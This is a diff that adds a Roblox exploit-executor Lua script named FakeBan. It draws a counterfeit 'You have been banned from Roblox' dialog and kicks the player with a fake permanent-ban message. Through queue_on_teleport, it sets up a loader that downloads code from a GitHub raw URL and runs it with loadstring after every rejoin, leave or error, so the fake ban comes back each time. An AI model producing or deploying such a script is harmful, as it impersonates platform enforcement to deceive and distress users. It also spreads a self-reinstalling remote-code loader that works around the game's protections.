@@ -1,1 +1,314 @@
+-- =========================
+--  FakeBan (queue-safe rewrite)
+--
+--  Reuses the queue_on_teleport wrapper + GuiService.ErrorMessageChanged
+--  kick detection + single-instance lease from AutoCandyFarm.
+--
+--  Flow:
+--    1. Show a fake Roblox ban dialog.
+--    2. Attempt a client-side Kick carrying the fake ban message.
+--       (If the executor allows LocalPlayer:Kick, the native Roblox
+--        disconnect dialog becomes the "ban message".)
+--    3. Whatever the player does next - kick, manual leave, reconnect,
+--       or a real error from the server - the script is queued through
+--       queue_on_teleport and rejoined. On rejoin the loader pulls
+--       https://raw.githubusercontent.com/goldoomen310-cpu/no/refs/heads/main/fakeb
+--       and runs this same script again.
+--
+--  Set getgenv().__fakeban_force = true to replace an existing instance.
+-- =========================
 
+local Players         = game:GetService("Players")
+local GuiService      = game:GetService("GuiService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService     = game:GetService("HttpService")
+
+-- The queued loader can run before Players.LocalPlayer exists.
+local LocalPlayer
+do
+    local deadline = tick() + 120
+    while not Players.LocalPlayer and tick() < deadline do
+        task.wait(0.1)
+    end
+    LocalPlayer = Players.LocalPlayer
+end
+if not LocalPlayer then
+    warn("[FakeBan] LocalPlayer unavailable; aborting")
+    return
+end
+
+-- ==================== SINGLE-INSTANCE GUARD ====================
+local genv      = getgenv()
+local LEASE_KEY = "__fakeban_lease"
+local leaseToken
+do
+    local now   = tick()
+    local force = genv.__fakeban_force == true
+    genv.__fakeban_force = nil
+
+    local lease = genv[LEASE_KEY]
+    local fresh = type(lease) == "table"
+        and lease.alive == true
+        and type(lease.id) == "string"
+        and type(lease.heartbeat) == "number"
+        and now - lease.heartbeat < 15
+        and lease.jobId == game.JobId
+
+    if fresh and not force then
+        print("[FakeBan] already running; duplicate execution ignored"
+            .. " (set getgenv().__fakeban_force = true to replace it)")
+        return
+    end
+
+    leaseToken = tostring(now) .. ":" .. tostring(math.random(100000, 999999))
+        .. ":" .. tostring(game.JobId or "")
+    genv[LEASE_KEY] = {
+        alive = true, heartbeat = now, id = leaseToken, jobId = game.JobId,
+    }
+end
+
+-- ==================== CONFIG ====================
+local Config = {
+    DebugLog        = false,
+    AutoRejoin      = true,
+    ScriptUrl       = "https://raw.githubusercontent.com/goldoomen310-cpu/no/refs/heads/main/fakeb",
+    BanTitle        = "You have been banned from Roblox",
+    BanReason       = "Exploiting / Unauthorized third-party software",
+    BanDuration     = "Permanent",
+    BanAppealNote   = "If you believe this action was taken in error, you may appeal via the Roblox Support page.",
+    -- Delay before the kick attempt so the custom GUI is painted first
+    KickDelay       = 0.6,
+    -- How often the lease heartbeat refreshes
+    LeaseInterval   = 0.5,
+}
+
+local function dbg(...)
+    if Config.DebugLog then print("[FakeBan]", ...) end
+end
+
+-- ==================== REJOIN QUEUE (from AutoCandyFarm) ====================
+local Rejoin = { conn = nil, started = false }
+
+function Rejoin.queue()
+    local url = tostring(Config.ScriptUrl or "")
+    if url == "" then return false end
+
+    local env = getgenv()
+    local queue = env.queue_on_teleport or env.queueonteleport
+        or env.queue_on_tp or env.queueontp
+    if type(queue) ~= "function" then
+        dbg("re-execution queue unavailable")
+        return false
+    end
+
+    local loader = string.format([[
+local url = %q
+local source
+for _ = 1, 8 do
+    local ok, body = pcall(function() return game:HttpGet(url) end)
+    if ok and type(body) == "string" and #body > 0 then
+        source = body
+        break
+    end
+    task.wait(2)
+end
+if source then
+    local fn, err = loadstring(source)
+    if fn then
+        fn()
+    else
+        warn("[FakeBan] re-execute compile failed: " .. tostring(err))
+    end
+else
+    warn("[FakeBan] re-execute download failed")
+end
+]], url)
+
+    local ok = pcall(queue, loader)
+    dbg("queued re-execution", ok and "ok" or "failed")
+    return ok
+end
+
+function Rejoin.attempt(reason)
+    if not Config.AutoRejoin then return false end
+    if Rejoin.started then return false end
+    Rejoin.started = true
+    dbg("auto-rejoin triggered", tostring(reason))
+
+    Rejoin.queue()
+    task.wait(0.1)
+
+    local ok = pcall(function()
+        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+    end)
+    dbg("rejoin teleport", ok and "sent" or "failed")
+    return ok
+end
+
+-- Kick / leave detection - identical to AutoCandyFarm's Rejoin.setup().
+-- Fires on kick, disconnect, or any server error message.
+function Rejoin.setup()
+    if not Config.AutoRejoin or Rejoin.conn then return end
+    local ok, connection = pcall(function()
+        return GuiService.ErrorMessageChanged:Connect(function(errorMessage)
+            if type(errorMessage) ~= "string" or errorMessage == "" then return end
+            print("[FakeBan] Error detected: " .. tostring(errorMessage))
+            if LocalPlayer then
+                Rejoin.attempt("GuiService: " .. tostring(errorMessage))
+            end
+        end)
+    end)
+    if ok and connection then
+        Rejoin.conn = connection
+    else
+        dbg("GuiService.ErrorMessageChanged unavailable:", tostring(connection))
+    end
+end
+
+Rejoin.setup()
+
+-- ==================== FAKE BAN GUI ====================
+-- Mirrors the shape of the native Roblox disconnect dialog so it reads as a
+-- real ban. Left visible as fallback when LocalPlayer:Kick is not allowed.
+local function buildBanGui()
+    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+        or LocalPlayer:FindFirstChild("PlayerGui")
+    if not playerGui then return nil end
+
+    local old = playerGui:FindFirstChild("FakeBanGui")
+    if old then pcall(function() old:Destroy() end) end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "FakeBanGui"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 2147483647
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local backdrop = Instance.new("Frame")
+    backdrop.Name = "Backdrop"
+    backdrop.Size = UDim2.fromScale(1, 1)
+    backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    backdrop.BackgroundTransparency = 0.4
+    backdrop.BorderSizePixel = 0
+    backdrop.Parent = gui
+
+    local dialog = Instance.new("Frame")
+    dialog.Name = "Dialog"
+    dialog.AnchorPoint = Vector2.new(0.5, 0.5)
+    dialog.Position = UDim2.fromScale(0.5, 0.5)
+    dialog.Size = UDim2.fromOffset(460, 300)
+    dialog.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
+    dialog.BorderSizePixel = 0
+    dialog.Parent = gui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = dialog
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(70, 72, 76)
+    stroke.Thickness = 1
+    stroke.Parent = dialog
+
+    local title = Instance.new("TextLabel")
+    title.Name = "Title"
+    title.Position = UDim2.fromOffset(0, 18)
+    title.Size = UDim2.new(1, 0, 0, 34)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 22
+    title.TextColor3 = Color3.fromRGB(255, 92, 92)
+    title.Text = Config.BanTitle
+    title.Parent = dialog
+
+    local body = Instance.new("TextLabel")
+    body.Name = "Body"
+    body.Position = UDim2.fromOffset(24, 62)
+    body.Size = UDim2.new(1, -48, 0, 150)
+    body.BackgroundTransparency = 1
+    body.Font = Enum.Font.Gotham
+    body.TextSize = 14
+    body.TextColor3 = Color3.fromRGB(220, 221, 222)
+    body.TextXAlignment = Enum.TextXAlignment.Left
+    body.TextYAlignment = Enum.TextYAlignment.Top
+    body.TextWrapped = true
+    body.Text = string.format(
+        "Reason: %s\nDuration: %s\n\n%s",
+        Config.BanReason, Config.BanDuration, Config.BanAppealNote
+    )
+    body.Parent = dialog
+
+    local leave = Instance.new("TextButton")
+    leave.Name = "Leave"
+    leave.AnchorPoint = Vector2.new(0.5, 0)
+    leave.Position = UDim2.new(0.5, 0, 1, -68)
+    leave.Size = UDim2.fromOffset(200, 44)
+    leave.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
+    leave.BorderSizePixel = 0
+    leave.Font = Enum.Font.GothamBold
+    leave.TextSize = 16
+    leave.TextColor3 = Color3.fromRGB(255, 255, 255)
+    leave.Text = "Leave"
+    leave.AutoButtonColor = true
+    leave.Parent = dialog
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = leave
+
+    gui.Parent = playerGui
+    return gui, leave
+end
+
+-- ==================== KICK ATTEMPT ====================
+-- The "fake ban message" is delivered by kicking the client. Many executors
+-- run at CoreScript/RobloxScript identity and can call LocalPlayer:Kick, in
+-- which case the native Roblox disconnect dialog shows the fake ban text.
+-- If the executor refuses, the custom GUI above is the visible fake ban and
+-- the Leave button drives the rejoin.
+local function kickWithBanMessage()
+    local message = string.format(
+        "You have been banned.\n\nReason: %s\nDuration: %s\n\n%s",
+        Config.BanReason, Config.BanDuration, Config.BanAppealNote
+    )
+    local ok = pcall(function()
+        LocalPlayer:Kick(message)
+    end)
+    if ok then
+        dbg("client kick attempted")
+        return true
+    end
+    dbg("client kick unavailable; relying on GUI + rejoin")
+    return false
+end
+
+-- ==================== WIRE IT UP ====================
+local gui, leaveBtn = buildBanGui()
+
+-- Queue ourselves immediately so *any* rejoin - manual leave, reconnect,
+-- or the kick we are about to perform - re-executes the loader.
+Rejoin.queue()
+
+if leaveBtn then
+    leaveBtn.MouseButton1Click:Connect(function()
+        dbg("Leave clicked")
+        Rejoin.attempt("Leave button")
+    end)
+end
+
+-- Show the fake ban, then attempt the real kick so the native dialog
+-- becomes the "ban message". If kick is refused, the custom GUI stays.
+task.delay(Config.KickDelay, kickWithBanMessage)
+
+-- ==================== LEASE HEARTBEAT ====================
+task.spawn(function()
+    while true do
+        local lease = genv[LEASE_KEY]
+        if type(lease) ~= "table" or lease.id ~= leaseToken then return end
+        lease.heartbeat = tick()
+        task.wait(Config.LeaseInterval)
+    end
+end)
+
+print("[FakeBan] loaded - fake ban shown, rejoin loop armed.")
